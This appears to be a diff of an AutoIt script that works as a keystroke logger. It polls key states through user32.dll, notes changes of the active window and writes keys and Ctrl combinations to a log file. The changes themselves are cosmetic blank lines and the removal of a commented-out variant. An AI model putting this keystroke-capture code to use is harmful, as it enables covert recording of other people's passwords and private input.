@@ -1,13 +1,8 @@
 Func _isKeyPressed( $sKeyHexCode )
     Local $aReturn = DllCall( 'user32.dll', 'short', 'GetAsyncKeyState', 'int', '0x' & $sKeyHexCode )
+
     Return BitAND( $aReturn[0], 0x8000 ) <> 0
 EndFunc
-
-;~ Second variant:
-;~ Func _isKeyPressed2( $sKeyHexCode )
-;~     Local $aReturn = DllCall( 'user32.dll', 'short', 'GetKeyState', 'int', '0x' & $sKeyHexCode )
-;~     Return $aReturn[0] < -126
-;~ EndFunc
 
 Func _isKeyReleased( $sKeyHexCode )
     If _isKeyPressed( $sKeyHexCode ) Then
@@ -28,6 +23,7 @@ EndFunc
 Func _hasWindowChanged( $sWindow )
     If $sWindow == $sCurrentWindow Then Return False
     $sCurrentWindow = $sWindow
+
     Return True
 EndFunc
 
@@ -50,9 +46,11 @@ Func _wasKeyOfKeyTypePressed( $aKeyType, $iMode = 0 )
                 Case 1
                     If _hasWindowChanged( $sActivWindow ) Then FileWrite( $hLogFile, $sTextBlock )
                     FileWrite( $hLogFile, StringUpper( $sKey ) )
+
                 Case 2
                     If _hasWindowChanged( $sActivWindow ) Then FileWrite( $hLogFile, $sTextBlock )
                     FileWrite( $hLogFile, '[Ctrl]+[' & $sKey & ']')
+
                 Case Else
                     If _hasWindowChanged( $sActivWindow ) Then FileWrite( $hLogFile, $sTextBlock )
                     FileWrite( $hLogFile, $sKey )
